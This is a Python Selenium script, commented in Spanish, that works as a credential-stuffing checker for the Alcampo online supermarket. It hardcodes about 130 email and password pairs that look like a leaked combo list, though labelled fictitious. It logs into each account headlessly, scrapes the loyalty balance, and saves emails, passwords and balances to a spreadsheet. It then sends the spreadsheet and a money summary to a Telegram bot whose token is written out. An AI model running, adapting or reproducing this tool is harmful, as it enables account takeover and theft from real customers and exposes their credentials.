from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import pandas as pd
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from webdriver_manager.chrome import ChromeDriverManager # Import ChromeDriverManager

# Install ChromeDriver using webdriver_manager once to ensure compatibility
try:
    CHROME_DRIVER_PATH = ChromeDriverManager().install()
    print(f"ChromeDriver installed by webdriver_manager at: {CHROME_DRIVER_PATH}")
except Exception as e:
    print(f"Error installing ChromeDriver with webdriver_manager: {e}")
    # Fallback to the system-wide installed chromedriver if manager fails
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
    print(f"Falling back to system-wide ChromeDriver at: {CHROME_DRIVER_PATH}")

# =======================
# CUENTAS DE ALCAMPO (FICTICIAS)
# =======================
ACCOUNTS = [
  {"email": "leguardeno@gmail.com", "password": "Guardeno1"},
      {"email": "biljos56@gmail.com", "password": "Ainasio56"},
    {"email": "ikergolan@gmail.com", "password": "Melasuda1"},
    {"email": "madjoge@hotmail.com", "password": "Amelie1723!!"},
    {"email": "serginely@yahoo.es", "password": "Sapastra1304"},
    {"email": "marina_guna@hotmail.com", "password": "Serenata24"},
    {"email": "beleng222@hotmail.com", "password": "Gonzalezjorge84"},
    {"email": "impervalle@hotmail.com", "password": "Alejandro1716"},
    {"email": "paboncreaciones39@gmail.com", "password": "Rubiaaaa5"},
    {"email": "anesther79@hotmail.es", "password": "Llanes79"},
    {"email": "fmvp10@yahoo.es", "password": "Madera1081"},
    {"email": "karl_itos81@yahoo.com", "password": "21Barrandeguy"},
    {"email": "guimaguary@gmail.com", "password": "Isa260108"},
    {"email": "ibarasen@euskalnet.net", "password": "Chipiron1*"},
    {"email": "anadelasheras9@gmail.com", "password": "Santi123"},
    {"email": "Ramonmh64@gmail.com", "password": "Enjar@1964"},
    {"email": "inma.moya.gomez@gmail.com", "password": "Abc-123-midori"},
    {"email": "fpquintela@gmail.com", "password": "e)4mttNa"},
    {"email": "red8404@hotmail.com", "password": "xiste1963@"},
    {"email": "alba_ochoa_93@hotmail.com", "password": "Infantas1"},
    {"email": "davidlopezcogolludo@gmail.com", "password": "Lucia@15"},
    {"email": "sara.r.torrecilla@gmail.com", "password": "Nube2020*"},
    {"email": "j.paez.canarias@gmail.com", "password": "tibinouche3A"},
    {"email": "fgvcia2@yahoo.es", "password": "Ferran789"},
    {"email": "jesusgilvara@gmail.com", "password": "Jesus260583"},
    {"email": "dmosquera@gmx.com", "password": "Bender22"},
    {"email": "miangarcia.mg@gmail.com", "password": "1003Micky1977"},
    {"email": "tagilitana25@gmail.com", "password": "Cecilia.2010"},
    {"email": "jpurbenmateo@gmail.com", "password": "Abmm1294"},
    {"email": "javincha007@gmail.com", "password": "Barcelona1"},
    {"email": "davidbendicho@hotmail.com", "password": "Michifu5036"},
    {"email": "anabel_vila@yahoo.es", "password": "Anabel1980"},
    {"email": "ykravtseva@yahoo.es", "password": "Ksenia123"},
    {"email": "humberto_9888@hotmail.es", "password": "Lampard8"},
    {"email": "candelster@gmail.com", "password": "project@1"},
    {"email": "1244440@gmail.com", "password": "Re1244440"},
    {"email": "aaron.5@hotmail.es", "password": "Aitana20"},
    {"email": "aaroncortes23@hotmail.com", "password": "Neizan2017"},
    {"email": "acmorali@hotmail.com", "password": "Oriente59"},
    {"email": "agueferradas@gmail.com", "password": "Chapela231090"},
    {"email": "alarrea@ymail.com", "password": "mc0030FJX"},
    {"email": "antoniorodriguezsoy@gmail.com", "password": "Aa25332533"},
    {"email": "argaglass@hotmail.es", "password": "Almeria2017"},
    {"email": "ayaleta81@hotmail.com", "password": "Dragonball1981@"},
    {"email": "breiner90@hotmail.es", "password": "Colombia15"},
    {"email": "cap1ariza@gmail.com", "password": "Hippiebooh_18"},
    {"email": "corisco31@hotmail.com", "password": "29Poljas"},
    {"email": "deianjoi23105@gmail.com", "password": "PekeFly23"},
    {"email": "espinosillo61@gmail.com", "password": "licodia206@"},
    {"email": "gabrielanoemi33@gmail.com", "password": "*Coyagot6"},
    {"email": "guillermo@qualityservice.es", "password": "0437efbGHM"},
    {"email": "javilechuga2@hotmail.com", "password": "Toledo20"},
    {"email": "jm_giltoural@yahoo.es", "password": "Startrek1"},
    {"email": "josemaborrero@hotmail.com", "password": "Granita7"},
    {"email": "juliarodriguezmerino@hotmail.com", "password": "Lun@221071"},
    {"email": "kibele_bcn@hotmail.com", "password": "639081773Ww"},
    {"email": "kikorc@gmail.com", "password": "X3008n1012!"},
    {"email": "KURKOZ@GMAIL.COM", "password": "Aa@11071976"},
    {"email": "LLORAT666@GMAIL.COM", "password": "Alma180305"},
    {"email": "llorat666@gmail.com", "password": "Alma180305"},
    {"email": "martinszalas@yahoo.com", "password": "Maxdemage1989"},
    {"email": "montajesparques@gmail.com", "password": "Braulio70"},
    {"email": "munt4@yahoo.es", "password": "Tenerife25"},
    {"email": "mvinaras@hotmail.com", "password": "Todosjuntos3"},
    {"email": "nelsonleyva005@gmail.com", "password": "48771613kK"},
    {"email": "oomaf2@gmail.com", "password": "24Marzo00oomaf"},
    {"email": "oscar.alcolea@gmail.com", "password": "Mi2Apellid0"},
    {"email": "pilar.pitarch@hotmail.es", "password": "Mecano1969"},
    {"email": "ro.carou@gmail.com", "password": "Deneb.1978"},
    {"email": "rutinieto@gmail.com", "password": "Ruth10037500xq"},
    {"email": "shibo.156@gmail.com", "password": "Nereinha1992"},
    {"email": "spanishlord1@yahoo.es", "password": "Moncho@1961"},
    {"email": "stanciueduard2005@yahoo.com", "password": "EDI8702hbl"},
    {"email": "susanagallur@yahoo.es", "password": "Susana76"},
    {"email": "teresinia@hotmail.com", "password": "Irene2013"},
    {"email": "verocipi9@hotmail.com", "password": "Siempre9"},
    {"email": "XPFOXITOS@YAHOO.ES", "password": "eSales12_A"},
    {"email": "cornejo.irene2@gmail.com", "password": "Irene1906@"},
    {"email": "susanasalerosa@gmail.com", "password": "060817jorsuS"},
    {"email": "rodriguezsarai2515101998@gmail.com", "password": "Santamarta1998"},
    {"email": "angelrmr74@gmail.com", "password": "ngl1329R"},
    {"email": "felipequemada@gmail.com", "password": "Quemjor1"},
    {"email": "javiernavarrogri@hotmail.com", "password": "Wjagawja1473"},
    {"email": "noeliabm2000@gmail.com", "password": "Noelitaabm17"},
    {"email": "anaped82@gmail.com", "password": "Alejandro2011"},
    {"email": "chetansanket@hotmail.es", "password": "1Marcelino"},
    {"email": "monica291263@gmail.com", "password": "MonicaVidalBedoya63"},
    {"email": "gemiinavea@gmail.com", "password": "Tochuno70"},
    {"email": "quesadahermosillajuan@gmail.com", "password": "Juanybelen8788"},
    {"email": "besargon@hotmail.com", "password": "Dba24051988"},
    {"email": "patridunk@hotmail.com", "password": "$Casariche2010"},
    {"email": "inmadgt@gmail.com", "password": "Iqcg1210"},
    {"email": "soniagb72@hotmail.com", "password": "Po3990bs"},
    {"email": "silver310814@gmail.com", "password": "Compra12345"},
    {"email": "JAVIERNAVARROGRI@HOTMAIL.COM", "password": "Wjagawja1473"},
    {"email": "huevonleon81@gmail.com", "password": "wkqsG_X8Wm6Vb+?"},
    {"email": "ipillo@gmail.com", "password": "Ch235bd1!"},
    {"email": "beamarinho92@gmail.com", "password": "segupa9A!"},
    {"email": "alba7rose@gmail.com", "password": "697PituyAlba131"},
    {"email": "joaquin@suarez-puerta.com", "password": "Ja234872"},
    {"email": "cristinadelrio71@gmail.com", "password": "Cristina71"},
    {"email": "estefan_cn@hotmail.com", "password": "Wapetona1982"},
    {"email": "mixolas@gmail.com", "password": "Lamela526352."},
    {"email": "maikamarracoi@gmail.com", "password": "Maikita2342"},
    {"email": "ninopeva@gmail.com", "password": "Pakito1390"},
    {"email": "dcchust@gmail.com", "password": "Exceso1982"},
    {"email": "Jonathancortes1655@gmail.com", "password": "Samira2718"},
    {"email": "aleyreques@gmail.com", "password": "Treblaxela22"},
    {"email": "merche-1975@hotmail.es", "password": "Merediz1975"},
    {"email": "FJJULIANV@GMAIL.COM", "password": "Lydia030601"},
    {"email": "jesus.martin.gonzalez@gmail.com", "password": "SaraLixi_061106"},
    {"email": "marievelasco@msn.com", "password": "Marie1424"},
    {"email": "MIRIAMVALLES91@HOTMAIL.COM", "password": "Alcampo17.84"},
    {"email": "anainesvico@hotmail.com", "password": "Av637181887"},
    {"email": "princesita.loly@hotmail.es", "password": "Loly1971"},
    {"email": "RAULKOYT@GMAIL.COM", "password": "a2D1FD34"},
    {"email": "ibanssv@gmail.com", "password": "ThrombociD33"},
    {"email": "jdgalisteo@gmail.com", "password": "juandi@64"},
    {"email": "arm.monavie@hotmail.com", "password": "Sonia1978_"},
    {"email": "robertoescribano6@gmail.com", "password": "Roesmo1961+"},
    {"email": "nicolas.gerenstein@gmail.com", "password": "Getu123x123x"},
    {"email": "litelopez@gmail.com", "password": "Vivatunita1"},
    {"email": "elmisteriso55@yahoo.es", "password": "Powerrangers12"},
    {"email": "emanuelrazvan16@gmail.com", "password": "Rokanrol123"},
]

# =======================
# TELEGRAM CONFIG
# =======================
TELEGRAM_TOKEN = "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU"
CHAT_ID = -5049278431   # Tu chat_id

def enviar_telegram_texto(mensaje):
    """Envía texto por Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": mensaje}
    requests.post(url, data=data)

def enviar_telegram_documento(path, caption=""):
    """Envía un archivo por Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    with open(path, "rb") as file:
        data = {"chat_id": CHAT_ID, "caption": caption}
        requests.post(url, data=data, files={"document": file})

# =======================
# FUNCION PARA PROCESAR CUENTA
# =======================
def procesar_cuenta(email, password):
    print(f"\n→→ Procesando cuenta: {email}")
    
    intentos_max = 3
    
    for intento in range(1, intentos_max + 1):
        driver = None
        try:
            if intento > 1:
                print(f"⚠️ Reintentando {email} (Intento {intento}/{intentos_max})...")

            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            
            # Use the pre-installed chromedriver
            driver = webdriver.Chrome(
                service=Service(CHROME_DRIVER_PATH),
                options=chrome_options
            )

            driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
            time.sleep(3)

            email_field = driver.find_element(By.ID, "uname1")
            password_field = driver.find_element(By.ID, "pwd1")

            email_field.send_keys(email)
            password_field.send_keys(password)
            password_field.send_keys(Keys.ENTER)
            time.sleep(5)

            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
            time.sleep(2)
            driver.refresh()
            time.sleep(3)

            saldo = "No encontrado"
            try:
                elemento = driver.find_element(
                    By.XPATH,
                    "/html/body/div[1]/div/div[1]/main/div[2]/div[2]/div/div/span"
                )
                saldo = elemento.text.strip()
            except:
                pass

            print(f"✔ {email} → SALDO: {saldo}")
            return {"email": email, "password": password, "saldo": saldo}

        except Exception as e:
            print(f"❌ Error en {email} (Intento {intento}): {e}")
            if intento == intentos_max:
                return {"email": email, "password": password, "saldo": f"Error: {e}"}
            time.sleep(3) # Esperar antes de reintentar

        finally:
            if driver:
                driver.quit()

# =======================
# EJECUTAR TODO EN PARALELO
# =======================
resultados = []

print("\n🔥 Ejecutando todas las cuentas en paralelo...\n")

with ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(procesar_cuenta, acc["email"], acc["password"]) for acc in ACCOUNTS]
    for future in as_completed(futures):
        resultados.append(future.result())

# =======================
# GUARDAR RESULTADOS EN EXCEL
# =======================
df = pd.DataFrame(resultados)
excel_path = "saldos_alcampo.xlsx"
df.to_excel(excel_path, index=False)

print("\n💾 Datos guardados en:", excel_path)

# =======================
# CALCULAR RESUMEN Y ENVIAR
# =======================
def limpiar_saldo(saldo_str):
    """Convierte texto tipo '5,30 €' a float 5.30"""
    try:
        if "Error" in saldo_str or "No encontrado" in saldo_str:
            return 0.0
        # Eliminar símbolo euro, espacios y cambiar coma por punto
        limpio = saldo_str.replace('€', '').replace(' ', '').replace(',', '.').strip()
        return float(limpio)
    except:
        return 0.0

saldo_total = 0.0
cuenta_top = {"email": "N/A", "saldo_val": 0.0}
cuentas_con_saldo = 0

for r in resultados:
    valor = limpiar_saldo(r["saldo"])
    saldo_total += valor
    if valor > 0:
        cuentas_con_saldo += 1
    if valor > cuenta_top["saldo_val"]:
        cuenta_top = {"email": r["email"], "saldo_val": valor}

mensaje_resumen = (
    f"📊 **RESUMEN ALCAMPO**\n\n"
    f"✅ Cuentas procesadas: {len(resultados)}\n"
    f"💰 **Saldo Total:** {saldo_total:.2f} €\n"
    f"💎 Cuentas con dinero: {cuentas_con_saldo}\n"
    f"🏆 **Top Cuenta:** {cuenta_top['email']} ({cuenta_top['saldo_val']:.2f} €)"
)

print("\n" + mensaje_resumen)
enviar_telegram_texto(mensaje_resumen)

# =======================
# ENVIAR UN SOLO MENSAJE CON EL EXCEL
# =======================
enviar_telegram_documento(
    excel_path,
    caption="📊 Reporte de saldos de cuentas Alcampo"
)

print("🎉 PROCESO COMPLETO Y ENVIADO A TELEGRAM\n")